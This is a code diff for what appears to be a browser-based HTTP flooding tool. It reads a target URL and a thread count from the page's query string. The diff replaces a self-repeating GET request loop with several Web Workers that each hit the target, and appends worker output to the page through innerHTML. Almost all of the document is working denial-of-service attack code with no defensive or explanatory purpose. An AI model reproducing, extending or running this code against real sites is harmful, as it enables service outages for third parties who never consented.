@@ -195,31 +195,26 @@ function getQueryVariable(variable)
     console.log('Query variable %s not found', variable);
 }
 
-var url = getQueryVariable('url');
-var threads = getQueryVariable('threads');
-var uaHead = generateUA();
+function bootstrap() {
+    var url = getQueryVariable('url');
+    var threads = getQueryVariable('threads');
+    var uaHead = generateUA();
 
-sendPacket(url);
+    var messageBox = document.getElementById('message');
 
-function sendPacket(url)
-{
-    var request = new XMLHttpRequest();
-    request.open('GET', url);
-    request.setRequestHeader("Access-Control-Allow-Origin", "*");
-    request.setRequestHeader("Access-Control-Allow-Methods", "GET, POST, PATCH, PUT, DELETE, OPTIONS");
-    request.setRequestHeader("Access-Control-Allow-Headers", "Origin, Content-Type, X-Auth-Token");
-
-    request.onreadystatechange = function()
-    {
-        if (this.readyState == 4 && this.status == 200)
-        {
-            console.log("[INFO] SENDED Packet")
-            sendPacket(url);
-        }
-        else
-        {
-            console.log("[ERROR] Failed Packet")
-        }
-    }
-    request.send();
+    for (var i = 0; i < threads; i++) createWorker(url, uaHead, function(data) {
+        messageBox.innerHTML += '<br />' + data;
+    });
 }
+
+function createWorker(urlAdress, uaHead, log) {
+    var worker = new Worker('worker.js');
+    worker.postMessage({ url: urlAdress, userAgent: uaHead });
+
+    worker.onmessage = (function(e) {
+        console.log(e.data);
+        log(e.data);
+    });
+}
+
+bootstrap();
